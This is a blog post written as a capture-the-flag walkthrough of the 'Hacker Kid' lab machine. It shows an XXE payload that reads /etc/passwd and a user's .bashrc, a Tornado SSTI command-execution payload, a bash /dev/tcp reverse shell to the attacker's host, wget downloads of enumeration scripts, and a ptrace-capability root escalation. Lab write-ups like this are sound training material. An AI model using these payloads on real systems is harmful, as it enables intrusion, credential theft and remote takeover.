---
layout: post
title: CTF hacker kid
date:   2022-02-27 20:19:25 -0600
categories: CTF
tags: Linux
---
# netdiscover
![](https://i.imgur.com/gj4wLDE.png)
192.168.0.32
# nmap
```sh
nmap -Sv 192.168.0.32 -p-

PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
9999/tcp open  http    Tornado httpd 6.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Port 80
## web page
![](https://i.imgur.com/mwANKS0.png)

![](https://i.imgur.com/FkQUeq2.png)
![](https://i.imgur.com/JkFZ9g8.png)

## gobuster
```sh
gobuster dir -t 100 -u http://192.168.0.32/ -w Documents/wordlist/directory-list-medium.txt 

/css                  (Status: 301) [Size: 310] [--> http://192.168.0.32/css/]
/javascript           (Status: 301) [Size: 317] [--> http://192.168.0.32/javascript/]
/images               (Status: 301) [Size: 313] [--> http://192.168.0.32/images/]    
/server-status        (Status: 403) [Size: 277]      
```
Nothing interesting.

# Port 9999
http://192.168.0.32:9999/login?next=%2F
![](https://i.imgur.com/AouQrsq.png)
## gobuster
```sh
gobuster dir -t 100 -u http://192.168.0.32:9999/ -w Documents/wordlist/directory-list-medium.txt 

/login                (Status: 200) [Size: 452]
/logout               (Status: 302) [Size: 0] [--> /]
```

## source code

![](https://i.imgur.com/Zg6R0gv.png)
I remove the hidden argument.
![](https://i.imgur.com/VEmZ3QP.png)
I have something to do with the xsrf cookie but it's too hard to find the right cookie to inject.
![](https://i.imgur.com/VDDbmV8.png)

# Back to port 80
TO DO: Use a GET parameter page_no  to view pages.

So I have to do something like this:
http://192.168.0.32/index.php\?page_no\=1
And it's working:
![](https://i.imgur.com/OYYmbqc.png)

I will script something, I can do it with burpsuit too.
I'm grabing the size of the page.

```sh
i=0
n=3654
while true; do
	size=$(curl -so /dev/null  http://192.168.0.32/index.php\?page_no\=$i -w '%{size_download}')
	echo "$i: $size"
	if [ $size != $n ]; then
		break
	fi
	((i=i+1))
done
```
Output:
```sh
➜  hackerkid ./c.sh 
0: 3654
1: 3654
2: 3654
3: 3654
4: 3654
5: 3654
6: 3654
7: 3654
8: 3654
9: 3654
10: 3654
11: 3654
12: 3654
13: 3654
14: 3654
15: 3654
16: 3654
17: 3654
18: 3654
19: 3654
20: 3654
21: 3849
```

Page 21
http://192.168.0.32/index.php\?page_no\=21
![](https://i.imgur.com/ui0xg45.png)

# /etc/hosts
I'm adding this line to my file.

192.168.0.32 hacker.blackhat.local blackhat.local


# dig
I have to use dig on the domain name.
```sh 
dig hackers.blackhat.local @192.168.0.32
; <<>> DiG 9.18.0 <<>> hackers.blackhat.local @192.168.0.32
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 17027
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: a2f3e2323bd5863f010000006212500721681d408206f9d6 (good)
;; QUESTION SECTION:
;hackers.blackhat.local.		IN	A

;; AUTHORITY SECTION:
blackhat.local.		3600	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600

;; Query time: 3 msec
;; SERVER: 192.168.0.32#53(192.168.0.32) (UDP)
;; WHEN: Sun Feb 20 15:28:23 CET 2022
;; MSG SIZE  rcvd: 125
```

COOKIE: a2f3e2323bd5863f010000006212500721681d408206f9d6 (good)
hackerkid.blackhat.local
 
Now I have to add it to my hosts file.

hackerkid.blackhat.local


# xxe exploit
The form is build with xml, so I can exploit it with a xxe exploit.
https://infosecwriteups.com/exploiting-xml-external-entity-xxe-injection-vulnerability-f8c4094fef83
![](https://i.imgur.com/KWuDEIv.png)
You have to type this in the xml request, it will display nothing. 
```xml
<!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```
And then display it wih this:
```xml
&xxe;
```
But you can't put it anywhere, it have to replace the email content.

## Read the bashrc
Fist I tryed to download a file then execute it with php.
And use curl -O on a revershell script but it's not working too.
https://cxyy4rle.blogspot.com/2019/10/reading-local-files-with-xxe-attacks.html

I willl try this on the user saket, I saw him in the /etc/passwd.
```xml
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc" >]>
```
![](https://i.imgur.com/86wEsDp.png)
Now I have to decode it:
https://www.base64decode.org/
![](https://i.imgur.com/EWJo9bs.png)
```sh
#Setting Password for running python app
username="admin"
password="Saket!#$%@!!"
```


# Tornado server
I have to login to the website with there's credentials.
http://192.168.0.32:9999/login?next=%2F
I'm using saket because it's not working with admin, and this user is un the /etc/passwd file  and in the password. 
![](https://i.imgur.com/sdWJPGr.png)
I'm logged.
![](https://i.imgur.com/8G8zQTc.png)
There is nothing else on this page.
  
```sh
Tell me your name buddy  
How can i get to know who are you ??
```
He want a name, and he is using the word get, I'm not the best in english but, I think this sentence could be "how can I know who you are?"
So I have to get a name.
# SSTI
https://support.clickmeter.com/hc/en-us/articles/211032666-URL-parameters-How-to-pass-it-to-the-destination-URL
 **www.yoursite.com?myparam={id}**
 Let's try it:
 **http://192.168.0.32:9999/?name={id}**
 ![](https://i.imgur.com/iG2bLi6.png)
 Can I do something with this? 
 **http://192.168.0.32:9999/?name={{7*7}}**
 ![](https://i.imgur.com/lb3fu2v.png)
 This is good, the name of what I'm doing is Server Side Template Injection (SSTI).
 ## Reversshell
 
 So I found a way to exec a command.
 ```sh
 http://192.168.0.32:9999/?name={%import%20os%}{{os.popen(%22whoami%22).read()}}
 ```
 ![](https://i.imgur.com/pPLSXaE.png)
 Good now I want to use a revershell.
 I'm gonnna use this one:
 ```sh
 bash -c "bash -i >& /dev/tcp/192.168.0.21/4648 0>&1"
 ```
 
But when I'm trying to run it in my browser I have an error.
I have to use `burpsuit`.
With this tool I saw where was the problem, the `&` was not in the payload, it was interpreted as an another command.
I have to encode my request and then send it.
https://www.urlencoder.org/
```sh
{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/192.168.0.21/4648 0>&1"')}}
```
Output:
```sh
%7B%25%20import%20os%20%25%7D%7B%7Bos.system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.0.21%2F4648%200%3E%261%22%27%29%7D%7D
```
I have to listen first.
```sh
nc -nlvp 4648
```
![](https://i.imgur.com/rfj0dri.png)
![](https://i.imgur.com/YLKgvAa.png)

# Enumeration
## Create web server 
On my computer.
```sh
python2.7 -m SimpleHTTPServer
```
## Download them
```sh
wget http://192.168.0.21:8000/lse.sh
wget http://192.168.0.21:8000/lin.py
```

 ![](https://i.imgur.com/14FV4Qm.png)
![](https://i.imgur.com/IYKaZIL.png)

Nothing interesting
## Bash history
![](https://i.imgur.com/YYCyM9U.png)
Only this part is interesting.
```sh
python2.7 inject.py 405
nc 127.0.0.1 5600
ps -eax|grep root
ps -eaf|grep root
python2.7 inject.py 735
nc 127.0.0.1 5600
```
So, in the first line he is using an injector on the PID 405.
Then open netcat to listen.
I think it was the wrong PID so he list them.
He list the PID with root permisions.
Then use the injector with the good PID
And he use the commands:
```sh
ps -eax|grep root
ps -eaf|grep root
```


# exploit
https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc

```sh
saket@ubuntu:~$ ps -eaf|grep root
ps -eaf|grep apache
root        1363       1  0 05:44 ?        00:00:00 /usr/sbin/apache2 -k start
```

![](https://i.imgur.com/Z5L3wdi.png)
The PID is 1363.
```sh
python2 inject.py 1363
```
You can check the open port, it should be 5600.
```sh
netstat -tnlp
```
![](https://i.imgur.com/Xe2o3uN.png)
Then we can use netcat to listen on the port.
```sh
nc 127.0.0.1 5600
```
Now you are root.
![](https://i.imgur.com/tUBWRPo.png)













